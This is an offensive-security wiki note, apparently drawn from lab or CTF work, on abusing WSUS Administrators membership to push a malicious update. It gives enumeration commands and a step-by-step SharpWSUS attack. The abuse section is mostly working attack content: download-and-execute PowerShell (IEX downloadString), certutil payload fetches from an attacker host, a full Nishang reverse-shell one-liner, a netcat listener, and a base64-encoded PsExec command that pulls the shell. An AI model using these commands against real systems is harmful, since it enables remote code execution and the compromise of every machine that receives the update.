---
Primary_category: "[[WSUS]]"
title: "WSUS ADMINISTRATORS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WSUS]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS PRIVESC]]

#### *Theory*

The ***WSUS Administrators*** group is a local-scope group created in the server where the *Windows Service Updates Services ( WSUS )* feature is installed and deployed

Its members have privileged rights over the *WSUS Service*, including:

- ***Manage and Deploy Updates***

- ***Full Control over the WSUS Configuration***

- ***Approve, Revove, Create and Delete updates***

As stated, this group is not a domain group, it exists in the *WSUS* server locally

Moreover, membership in this group does not grant any administrative privileges over the server in question

However, this group is considered highly privileged as any principal belonging to it can manage the mechanism responsible for distributing updates to managed devices

Therefore, an attacker could create and subsequently approve a malicious update and distribute it among the devices in question

---

#### *Enumeration*

##### *Manual*

###### *Identifying the current Security Context*

> ***Privileges, membership, user information...***

```bash
whoami /group
net user <USER> # Or net user /domain <USER>
```

###### *Members of WSUS Administrators*

> ***CMD & PS***

```bash
net localgroup 'WSUS Administrators'
```

> ***PS***

```bash
Get-LocalGroupMember -Group 'WSUS Administrators'
```

###### *Locating the WSUS Server*

> ***From a managed WSUS Client*** 🎯

> ***Check both `WUServer` and `WUStatusServer` values***

> ***CMD & PS***

```bash
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate"
```

```bash
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
```

```bash
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v WUStatusServer
```

> ***PS***

```bash
Get-ItemProperty -Path HKLM:Software\Policies\Microsoft\Windows\WindowsUpdate
```

```bash
(Get-ItemProperty -Path HKLM:Software\Policies\Microsoft\Windows\WindowsUpdate).WUServer
```

```bash
(Get-ItemProperty -Path HKLM:Software\Policies\Microsoft\Windows\WindowsUpdate).WUStatusServer
```

###### *Checking whether the System is using WSUS*

> ***From a managed WSUS Client*** 🎯

> ***Check `UseWUServer`***

- ***1 → Machine is configured to use an internal WSUS Server for updates***

- ***0 → Windows/Microsoft Update will likely be used to check for updates***

> ***CMD & PS***

```bash
reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" /v UseWUServer
```

> ***PS***

```bash
(Get-ItemProperty -Path 'HKLM:Software\Policies\Microsoft\Windows\WindowsUpdate\AU').UseWUServer
1
```

##### *Automated*

###### *SharpWSUS*

- ***[SharpWSUS](https://github.com/nettitude/SharpWSUS)***

***Setup***

> ***From the attacker*** ⚔️

```bash
curl --silent --show-error --location --request GET --remote-name 'https://gist.github.com/zimnyaa/734446d946133b39556978148a1c0c52/raw/ab89964cf79218d3edb00ce26cd6af17dad21823/SharpWSUS.ps1'
```

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir $env:systemroot\temp\LPE
cd $env:systemroot\temp\LPE
```

```bash
IEX (New-Object Net.WebClient).downloadString('http://<ATTACKER_IP>/SharpWSUS.ps1')
```

***Usage***

```bash
Invoke-SharpWSUS locate
```

```bash
Invoke-SharpWSUS inspect
```

---

#### *Abuse*

##### *Workflow*

First, the attacker must compromise a domain or local account that belongs to the *WSUS Administrators* local group of a *WSUS Server*

Then, to met the requirements of this privesc vector, we must have remote or interactive access to the *WSUS* server as well, as we have to create and approve the malicious update

Similarly, once we're inside the *WSUS server*, we can verify whether the server itself also receives and install the given updates by doing ***[[#Checking whether the System is using WSUS|this]]***

Typically, *WSUS* is deployed via *GPO*, and if the client *GPO* is linked to an *OU* that includes the *WSUS server*, then the server becomes a client of *WSUS* as well

If so, we can compromise the *WSUS Server* as well

To do so, it's as simple as creating and approving a malicious udpate, which will perform the specified action during its creation

In this case, we can leverage a *Microsoft-signed* binary, such as ***[PSExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)*** from *SysInternals*, to execute an arbitrary command once the update is installed in the managed devices

With that done, it's just a matter of time before the update installation is completed

##### *Requirements*

- ***The controlled account must be a member of the WSUS Administrators Group***

- ***Physical/Remote Access to the WSUS Server ( WinRM, RDP, [[SHELLS AND PAYLOADS|Reverse Shell]]... )***

> ***To create the malicious update***

- ***The distributed binary must be digitally signed by Microsoft***

> ***e.g. PSExec.exe from SYSInternals***

- ***The Target Machine must be configured to receive WSUS Updates***

##### *Windows*

All that said, we are describing a situation where an operator compromise a *WSUS* server that is a *WSUS* client as well as its updates are managed by *WSUS*

So, once we have remote or interactive access to the *WSUS* server, just proceed as follows

###### *Listing the WSUS Server*

> ***From the target*** 🎯

> ***See [[#Locating the WSUS Server]] and [[#Automated|Automated Enumeration]]***

###### *Checking whether the System is using WSUS or not*

> ***From the target*** 🎯

> ***See [[#Checking whether the System is using WSUS]]***

###### *Transferring a Microsoft-Signed Binary to the target*

> ***From the attacker*** ⚔️

```bash
curl --silent --show-error --location --request GET 'https://download.sysinternals.com/files/PSTools.zip' | bsdtar --extract --file - PsExec64.exe
```

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯 

```bash
mkdir $env:systemroot\temp\LPE
cd $env:systemroot\temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/PsExec64.exe'
```

###### *Downloading the Reverse Shell Script*

> ***From the attacker*** ⚔️

- ***Downloading the script***

```bash
curl --silent --show-error --location --request GET 'https://github.com/samratashok/nishang/raw/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1' --output rev.ps1
```

- ***Setting up it***

```bash
nvim !$
```

> [!BUG]- *rev.ps1*
>
> ```bash
> $client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

###### *Setting up the HTTP Server and TCP Listener*

> ***From the attacker*** 🎯

> ***HTTP Server to share the Rev. Shell script and TCP Listener to receive the incoming Shell***

- ***HTTP Server***

```bash
python3 -m http.server 80
```

- ***TCP Listener***

```bash
rlwrap -CaR nc -nlvp <TCP_PORT>
```

###### *Generating the Reverse Shell Oneliner*

> ***From the attacker*** ⚔️

To ensure a proper execution, we will generate from our side a powershell oneliner that will be passed to the *PSExec* command as argument *( Spawning Process )*

```bash
echo -n 'IEX (New-Object Net.WebClient).downloadString("http://<ATTACKER_IP>/rev.ps1")' | iconv --from-code UTF-8 --to-code UTF-16LE | base64 -w 0 ; echo
```

###### *Creating the malicious Update*

- ***[SharpWSUS](https://github.com/nettitude/SharpWSUS)***

***Setup***

> ***Check [[#Automated|this]] out for the PS Wrapper***

> ***Static Binary Setup below*** ⬇️

> ***From the attacker*** ⚔️

```bash
curl --silent --show-error --location --request GET --remote-name 'https://github.com/h4rithd/PrecompiledBinaries/raw/refs/heads/main/SharpWSUS/SharpWSUS.exe'
```

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SharpWSUS.exe'
```

***Usage***

> ***From the target*** 🎯

```bash
.\SharpWSUS.exe create /payload:'<PSEXEC_PATH>' /args:'-accepteula -s -d Powershell.exe -EncodedCommand SQBFAFgAIAQB3AC0...<SNIP>...A=' /title:'LPE'
```

> [!DANGER]- *e.g.*
>
> ```bash
> .\SharpWSUS.exe create /payload:$env:systemroot\temp\LPE\PsExec64.exe /args:'-accepteula -s -d Powershell.exe  -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAb
gB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQA4ADMALwByAGUAdgAuAHAAcwAxACIAKQA=' /title:'LPE' 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [*] Action: Create Update
> [*] Creating patch to use the following:
> [*] Payload: PsExec64.exe
> [*] Payload Path: C:\Windows\temp\LPE\PsExec64.exe
> [*] Arguments: -accepteula -s -d Powershell.exe  -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQA4ADMALwByAGUAdgAuAHAAcwAxACIAKQA=
> [*] Arguments (HTML Encoded): -accepteula -s -d Powershell.exe  -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQA4ADMALwByAGUAdgAuAHAAcwAxACIAKQA=
> 
> ################# WSUS Server Enumeration via SQL ##################
> ServerName, WSUSPortNumber, WSUSContentLocation
> -----------------------------------------------
> DC, 8530, c:\WSUS\WsusContent
> 
> ImportUpdate
> Update Revision ID: 37
> PrepareXMLtoClient
> InjectURL2Download
> DeploymentRevision
> PrepareBundle
> PrepareBundle Revision ID: 38
> PrepareXMLBundletoClient
> DeploymentRevision
> 
> [*] Update created - When ready to deploy use the following command:
> [*] SharpWSUS.exe approve /updateid:8e12597a-f930-4f74-a06b-144471b42686 /computername:Target.FQDN /groupname:"Group Name"
> 
> [*] To check on the update status use the following command:
> [*] SharpWSUS.exe check /updateid:8e12597a-f930-4f74-a06b-144471b42686 /computername:Target.FQDN
> 
> [*] To delete the update use the following command:
> [*] SharpWSUS.exe delete /updateid:8e12597a-f930-4f74-a06b-144471b42686 /computername:Target.FQDN /groupname:"Group Name"
> 
> [*] Create complete
> ```
>

###### *Approving the malicious Update*

> ***From the target*** 🎯

- ***[SharpWSUS](https://github.com/nettitude/SharpWSUS)***

```bash
.\SharpWSUS.exe approve /updateid:'<UPDATE_ID>' /computername:'<TARGET_FQDN>' /groupname:"LPE"
```

> [!DANGER]- *e.g.*
>
> ```bash
> .\SharpWSUS.exe approve /updateid:8e12597a-f930-4f74-a06b-144471b42686 /computername:DC01.DOMAIN.INTERNAL /groupname:"LPE"
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [*] Action: Approve Update
> 
> Targeting DC01.DOMAIN.INTERNAL
> TargetComputer, ComputerID, TargetID
> ------------------------------------
> dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
> Group Exists = False
> Group Created: LPE
> Added Computer To Group
> Approved Update
> 
> [*] Approve complete
> ```
>

###### *Checking the Update Status*

> ***Whether it's installed or not***

We just have to wait for the incoming connection. In the meantime, we can check the status of the update

- ***[SharpWSUS](https://github.com/nettitude/SharpWSUS)***

```bash
.\SharpWSUS.exe check /updateid:'<UPDATE_ID>' /computername:'<TARGET_FQDN>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> .\SharpWSUS.exe check /updateid:8e12597a-f930-4f74-a06b-144471b42686 /computername:DC01.DOMAIN.INTERNAL
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [*] Action: Check Update
> 
> Targeting DC01.DOMAIN.INTERNAL
> TargetComputer, ComputerID, TargetID
> ------------------------------------
> dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
> 
> [*] Update is not installed
> 
> [*] Check complete
> ```
>

---

#### *Resources*

***[Lorenzo Meacci: WSUS Exploitation - All you need to know](https://lorenzomeacci.com/wsus-exploitation-all-you-need-to-know)***